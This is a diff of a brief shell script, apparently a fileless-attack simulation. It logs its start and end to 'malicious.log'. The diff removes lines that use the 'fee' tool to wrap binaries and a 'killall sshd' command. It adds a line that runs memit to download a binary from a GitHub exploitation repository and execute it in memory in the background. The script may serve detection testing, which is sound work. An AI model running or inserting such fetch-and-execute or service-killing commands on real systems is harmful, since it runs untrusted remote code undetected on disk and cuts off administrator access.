@@ -2,7 +2,5 @@
 LOG_NAME="malicious.log"
 
 echo "Fileless attack started" >> $LOG_NAME
-fee /usr/bin/ls > output.py
-fee -a "killall sshd" ./busybox > output.py
-
+./memit-linux-amd64 https://raw.githubusercontent.com/MaherAzzouzi/LinuxExploitation/master/Fword2020/blacklist/blacklist &
 echo "Fileless attack ended" >> $LOG_NAME
